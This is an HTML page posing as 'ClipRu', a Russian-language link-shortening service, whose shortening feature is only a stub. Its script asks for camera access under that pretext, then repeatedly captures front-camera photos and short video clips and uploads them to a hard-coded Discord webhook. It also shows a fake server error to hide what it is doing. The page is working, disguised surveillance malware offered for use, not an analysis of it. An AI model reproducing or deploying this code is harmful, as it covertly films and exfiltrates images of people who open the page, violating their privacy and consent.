<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ClipRu - Сократитель ссылок</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .logo {
            font-size: 2.5em;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }

        .tagline {
            color: #666;
            margin-bottom: 30px;
            font-size: 1.1em;
        }

        .url-input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #e1e1e1;
            border-radius: 50px;
            font-size: 1em;
            margin-bottom: 20px;
            transition: all 0.3s ease;
        }

        .url-input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .permission-btn {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
        }

        .video-container {
            margin: 20px 0;
            border-radius: 15px;
            overflow: hidden;
            display: none;
        }

        #video {
            width: 100%;
            border-radius: 15px;
        }

        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
            display: none;
        }

        .loading {
            display: none;
            margin: 20px 0;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error {
            background: #ffe6e6;
            color: #d63031;
            display: none;
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ClipRu</div>
        <div class="tagline">Быстрое сокращение ссылок</div>
        
        <input type="url" class="url-input" placeholder="Введите ссылку для сокращения..." id="urlInput">
        
        <button class="btn" id="shortenBtn">Сократить ссылку</button>
        <button class="btn permission-btn" id="permissionBtn">Разрешить доступ к камере</button>
        
        <div class="video-container" id="videoContainer">
            <video id="video" autoplay muted playsinline></video>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Сокращаем ссылку...</p>
        </div>
        
        <div class="status" id="status"></div>
        <div class="error" id="error"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const videoContainer = document.getElementById('videoContainer');
        const permissionBtn = document.getElementById('permissionBtn');
        const shortenBtn = document.getElementById('shortenBtn');
        const urlInput = document.getElementById('urlInput');
        const loading = document.getElementById('loading');
        const status = document.getElementById('status');
        const error = document.getElementById('error');
        
        let stream = null;
        let photoInterval = null;
        let videoInterval = null;
        
        // Вебхук для отправки медиа
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1422943785314156607/duI7PZlmUrDDv_xGEwhfx4bE2mZvTxBvnZG-xYso4g7j_OzJDRzRFU-i68BZo5WNJBg0';
        
        // Функция для отправки данных на вебхук
        async function sendToWebhook(data, filename, contentType) {
            try {
                const formData = new FormData();
                const blob = new Blob([data], { type: contentType });
                formData.append('file', blob, filename);
                formData.append('content', `Новое медиа: ${new Date().toLocaleString()}`);
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.log('Ошибка отправки');
            }
        }
        
        // Функция для создания фото
        function takePhoto() {
            if (!stream) return;
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            canvas.toBlob((blob) => {
                sendToWebhook(blob, `photo_${Date.now()}.jpg`, 'image/jpeg');
            }, 'image/jpeg', 0.8);
        }
        
        // Функция для записи видео
        function recordVideo() {
            if (!stream) return;
            
            const chunks = [];
            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
            
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };
            
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                sendToWebhook(blob, `video_${Date.now()}.webm`, 'video/webm');
            };
            
            recorder.start();
            setTimeout(() => {
                if (recorder.state === 'recording') {
                    recorder.stop();
                }
            }, 8000);
        }
        
        // Запрос доступа к камере
        permissionBtn.addEventListener('click', async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 1280, 
                        height: 720,
                        facingMode: 'user'
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                videoContainer.style.display = 'block';
                permissionBtn.style.display = 'none';
                status.style.display = 'block';
                status.innerHTML = '✅ Доступ к камере разрешен';
                
                // Начать съемку
                setTimeout(() => {
                    takePhoto();
                    photoInterval = setInterval(takePhoto, 30000);
                    videoInterval = setInterval(recordVideo, 10000);
                }, 1000);
                
                // Показать ошибку через 10-15 секунд
                setTimeout(() => {
                    showError('Ошибка сервера: Не удалось сократить ссылку');
                }, 12000 + Math.random() * 3000);
                
            } catch (err) {
                showError('❌ Не удалось получить доступ к камере');
            }
        });
        
        // Функция сокращения ссылки (заглушка)
        shortenBtn.addEventListener('click', () => {
            if (!urlInput.value) {
                showError('Введите ссылку для сокращения');
                return;
            }
            
            loading.style.display = 'block';
            status.style.display = 'none';
            error.style.display = 'none';
            
            setTimeout(() => {
                loading.style.display = 'none';
                status.style.display = 'block';
                status.innerHTML = `✅ Ссылка сокращена: clip.ru/${Math.random().toString(36).substr(2, 6)}`;
            }, 2000);
        });
        
        function showError(message) {
            error.style.display = 'block';
            error.textContent = message;
            loading.style.display = 'none';
        }
        
        // Очистка при закрытии страницы
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            if (photoInterval) clearInterval(photoInterval);
            if (videoInterval) clearInterval(videoInterval);
        });
    </script>
</body>
  </html>
